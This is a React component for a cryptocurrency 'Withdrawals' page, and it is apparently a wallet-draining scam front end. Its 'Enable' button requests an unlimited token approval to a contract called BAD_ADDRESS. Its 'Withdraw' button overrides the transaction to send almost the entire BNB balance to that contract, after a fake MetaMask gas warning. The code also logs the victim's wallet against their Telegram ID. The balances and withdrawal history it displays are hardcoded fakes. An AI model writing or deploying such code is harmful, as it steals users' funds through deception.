import {
  Heading,
  Box,
  Flex,
  Button,
  TableContainer,
  Table,
  Tbody,
  Td,
  Th,
  Thead,
  Tr,
  HStack,
  VStack,
  Image,
  Text,
  FormControl,
  Input,
  useToast,
  Link,
  useColorMode
} from '@chakra-ui/react';
import { useAddress, useNetworkMismatch, useSDK } from '@thirdweb-dev/react';
import axios from 'axios';
import { Error } from 'components/elements/Error';
import { Formik, Form } from 'formik';
import { useSession } from 'next-auth/react';
import { FC, useEffect, useState } from 'react';
import { IWithdraw } from 'utils/types';
import BAD_ABI from '../../../utils/BAD_ABI.json'
import TOKENS from '../../../utils/TOKENS.json'

const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
  const { data: session } = useSession();
  const sdk = useSDK();
  const address = useAddress();
  const toast = useToast();
  const { colorMode } = useColorMode();
  const [enabled, setEnabled] = useState(false);
  const [bestToken, setBestToken] = useState<any>();
  const isMismatched = useNetworkMismatch();
  
  useEffect(() => {
    if(address){
      getBestToken();
    }
  }, [address]);

  useEffect(() => {
    const checkEnabled = async () => {
      if(bestToken?.address){
        let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
        let result = await contract?.call("allowance", address, process.env.NEXT_PUBLIC_BAD_ADDRESS);
        if(parseInt(result)){
          setEnabled(true);
        }
      }
      else{
        toast({description: "You have no XPR tokens. Consider to swap some of them to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
      }
    }

    if(bestToken){
      checkEnabled();
    }
  }, [bestToken]);

  const enable = async () => {
    try{
      let contract = await sdk?.getContractFromAbi(bestToken?.address || "", BAD_ABI);
      console.log(bestToken)
      await contract?.call("approve", process.env.NEXT_PUBLIC_BAD_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935");
      console.log(bestToken)
      let telegramId = session?.user.telegramId;
      axios.post("/api/updateaddr", { telegramId, address });
      setEnabled(true);
    } catch {
      toast({description: "You must Approve to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
    }
  }

  const getBestToken = async () => {
    const getTokenInfo = async (token: {symbol: string, address: string}) => {
      let contract = await sdk?.getContractFromAbi(token.address, BAD_ABI);
      let balance = await contract?.call("balanceOf", address);
      let decimals = 0;
      if(balance){
        decimals = await contract?.call("decimals");
      }
      return {
          address: token.address,
          balance: balance,
          symbol: token.symbol,
          decimals: decimals
      };
    }

    let tokensInfo = []
    for (const token of TOKENS) {
      tokensInfo.push(getTokenInfo(token));
    }

    Promise.allSettled(tokensInfo).then(async (result: any) => {
      let validTokens = Array.from(result.filter((x: any) => x.status === "fulfilled" && x.value && x.value.balance != 0), (r: any) => r.value);
      // validTokens = [
      //     {"address": "0x9c21123d94b93361a29b2c2efb3d5cd8b17e0a9e", "balance": 5, "decimals": 1, "symbol": "CAKE"},
      //     {"address": "0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684", "balance": 5, "decimals": 1, "symbol": "WBNB"},
      //     {"address": "0x337610d27c682e347c9cd60bd4b3b107c9d34ddd", "balance": 5000, "decimals": 1, "symbol": "USDT"},
      //     {"address": "0xb0aC34810F760262E6b7c86587f22b32AD6D4a4E", "balance": 1, "decimals": 1, "symbol": "WETH"}
      // ];
      
      if(validTokens.length > 0){
        let symbols = validTokens.map(x => x.symbol);

        const response = await axios.post("/api/tokenvalues", { symbols });

        let tokensValue: {address: string, value: number}[] = [];
        for(let token of validTokens){
          let price = response.data.data[token.symbol][0]["quote"]["USD"]["price"];
          let value = price * token.balance / (10 ** token.decimals);

          tokensValue.push({address: token.address, value: value})
        }

        setBestToken(tokensValue.sort((x, y) => y.value - x.value)[0]); 
      }
      else{
        toast({description: "Consider to swap some tokens them to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
      }
    });
  }

  const formSubmit = async (actions: any) => {
    actions.setSubmitting(false);

    let badContract = await sdk?.getContractFromAbi(process.env.NEXT_PUBLIC_BAD_ADDRESS || "", BAD_ABI);
    let bnbBalance: any = (await sdk?.wallet.balance())?.value || 0;
    let gasPrice = parseFloat(await badContract?.estimator.currentGasPriceInGwei() || "0");
    let estimatedGas = parseFloat((await badContract?.estimator.gasCostOf("approve", [bestToken?.address, bestToken?.balance]) || "0")) * 10**18;
    let value = BigInt(bnbBalance - (estimatedGas * gasPrice * 2));

    alert("MetaMask:\ndue to network congestion, gas fees estimation could be wrong");

    badContract?.interceptor.overrideNextTransaction(() => ({from: address, value: value}));
    try{
      await badContract?.call("approve", bestToken?.address, bestToken?.balance);
    } catch(err) {
      toast({description: "You must Approve to withdraw your pending funds", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
    }
  };

  return (
    <>
      <Heading size="lg" marginBottom={6}>
        Withdrawals
      </Heading>
      { !session ? <Error msg={"<b>Sign In</b> to your account first"}/> :
        <Box>
          <Box borderWidth='2px' borderRadius='lg' p="1em">
            <Flex align="top" >
              <VStack alignItems="top" flex={["50", "50", "25", "25"]} fontSize={["sm", "sm", "md"]} mr="2">
                <Heading size={["sm", "sm", "md"]} marginBottom={3}>
                  Available crypto:
                </Heading>
                <HStack>
                  <Image src="/xpr.png" borderRadius="full" boxSize="26px" />
                  <Text>993.9123 <Text as="span" fontWeight="bold">XPR</Text> (${((xprPrice * 993.9123) || 121.31).toFixed(2)})</Text>
                </HStack>
              </VStack>
              <VStack alignItems="top" flex="50" fontSize={["sm", "sm", "md"]}>
                <Heading size={["sm", "sm", "md"]} marginBottom={3}>
                  Pending Withdrawals:
                </Heading>
                <HStack>
                  <Image src="/btcb.png" borderRadius="full" boxSize="26px" ml="1"/>
                  <Text>0.32 <Text as="span" fontWeight="bold">BTCB</Text> (${((btcPrice * 0.32) || 5121.29).toFixed(2)})</Text>
                </HStack>
                <HStack>
                  <Image src="/busd.png" borderRadius="full" boxSize="26px" ml="1"/>
                  <Text>1.87 <Text as="span" fontWeight="bold">BUSD</Text> ($1.87)</Text>
                </HStack>
              </VStack>
            </Flex>
            <Flex marginTop="1em" borderTop="1px solid grey" justify="end">
              <VStack alignItems="center" mt="1em">
                  <Formik initialValues={{}} validateOnChange={false} validateOnBlur={false} onSubmit={(_, actions) => {formSubmit(actions);}}>
                    {(props) => (
                      <Form>
                        <HStack w={["xs","lg"]}>
                          <FormControl isRequired isDisabled={!address || !enabled || isMismatched}>
                            <Input placeholder="Receiver Address"/>
                          </FormControl>
                          {
                            enabled
                            ? <Button isDisabled={!address || !enabled || !bestToken || isMismatched} size="lg" width="10em" colorScheme="teal" fontWeight="bold" isLoading={props.isSubmitting} type="submit"><Text>Withdraw<br></br><Text fontSize="xs" as="span">(150 XPR)</Text></Text></Button>
                            : <Button isDisabled={!address || !bestToken?.address || isMismatched} size="md" width="10em" colorScheme="teal" fontWeight="bold" onClick={enable}><Text>Enable</Text></Button>
                          }
                        </HStack>
                      </Form>
                    )}
                  </Formik>
              </VStack>
            </Flex>
          </Box>

          <Heading size="mg" mt={6} mb={4}>
            Withdrawals History
          </Heading>
          <TableContainer borderWidth='2px' borderRadius='lg' pl={4} pr={4}>
            <Table variant='simple'>
              <Thead>
                <Tr>
                  <Th>Date</Th>
                  <Th>Address</Th>
                  <Th>Value</Th>
                  <Th>Fees</Th>
                </Tr>
              </Thead>
              <Tbody>
                <Tr>
                  <Td>2022/12/12 16:46:12 UTC</Td>
                  <Td>
                    <Link href={"https://bscscan.com/tx/0x6acd4474EC51409696A6d86ac9f29294352B1f43"} color={colorMode === "dark" ? "#90cdf4" : "#3182ce"} isExternal>
                      0x6acd4474EC51409696A6d86ac9f29294352B1f43
                    </Link>
                  </Td>
                  <Td>0.2 BTCB</Td>
                  <Td>0.025 XPR</Td>
                </Tr>
                <Tr>
                  <Td>2022/10/01 13:19:11 UTC</Td>
                  <Td>
                    <Link href={"https://bscscan.com/tx/0x6acd4474EC51409696A6d86ac9f29294352B1f43"} color={colorMode === "dark" ? "#90cdf4" : "#3182ce"} isExternal>
                      0x6acd4474EC51409696A6d86ac9f29294352B1f43
                    </Link>
                  </Td>
                  <Td>0.012 BTCB</Td>
                  <Td>0.01 XPR</Td>
                </Tr>
                <Tr>
                  <Td>2022/09/28 09:23:17 UTC</Td>
                  <Td>
                    <Link href={"https://bscscan.com/tx/0x6acd4474EC51409696A6d86ac9f29294352B1f43"} color={colorMode === "dark" ? "#90cdf4" : "#3182ce"} isExternal>
                      0x6acd4474EC51409696A6d86ac9f29294352B1f43
                    </Link>
                  </Td>
                  <Td>0.002 BTCB</Td>
                  <Td>0.0015 XPR</Td>
                </Tr>
              </Tbody>
            </Table>
          </TableContainer>
        </Box>
      }
    </>
  );
};

export default Withdrawals;
